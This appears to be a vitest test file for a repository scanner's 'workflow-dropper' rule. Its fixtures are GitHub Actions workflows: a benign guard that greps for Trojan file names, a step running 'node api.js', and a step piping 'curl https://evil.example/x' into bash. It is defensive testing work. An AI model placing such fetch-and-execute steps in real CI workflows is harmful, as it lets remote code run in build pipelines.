import { describe, expect, it } from "vitest";
import { detectFile } from "@/lib/scanner/rules";

const SECURITY_GUARD = `name: Security Guard
on:
  push:
    branches: [ main ]
jobs:
  audit-malware-signatures:
    runs-on: ubuntu-latest
    steps:
      - name: Scan Prohibited Worm Files
        run: |
          echo "Checking for known Trojan files..."
          BLOCKED=$(git ls-files | grep -E 'api\\.js|temp_.*push\\.bat' || true)
          if [ -n "$BLOCKED" ]; then
            echo "::error::Blocked Trojan files detected"
            exit 1
          fi
      - name: Scan Package.json
        run: |
          echo "Checking package.json for api.js injections..."
          if grep -q "node api.js" package.json 2>/dev/null; then
            echo "::error::Malicious 'node api.js' found in package.json"
            exit 1
          fi
          echo "Repository integrity verified clean."
`;

describe("workflow-dropper", () => {
  it("does not flag a security workflow that only greps for node api.js", () => {
    expect(detectFile(".github/workflows/security-guard.yml", SECURITY_GUARD)).toEqual([]);
  });

  it("still flags a workflow that runs node api.js", () => {
    const malicious = `
name: infected
on: push
jobs:
  drop:
    runs-on: ubuntu-latest
    steps:
      - run: node api.js
`;
    const findings = detectFile(".github/workflows/drop.yml", malicious);
    expect(findings.some((f) => f.ruleId === "workflow-dropper")).toBe(true);
  });

  it("still flags curl piped to shell in a workflow step", () => {
    const malicious = `
name: infected
on: push
jobs:
  drop:
    runs-on: ubuntu-latest
    steps:
      - run: curl -s https://evil.example/x | bash
`;
    const findings = detectFile(".github/workflows/drop.yml", malicious);
    expect(findings.some((f) => f.ruleId === "workflow-dropper")).toBe(true);
  });
});
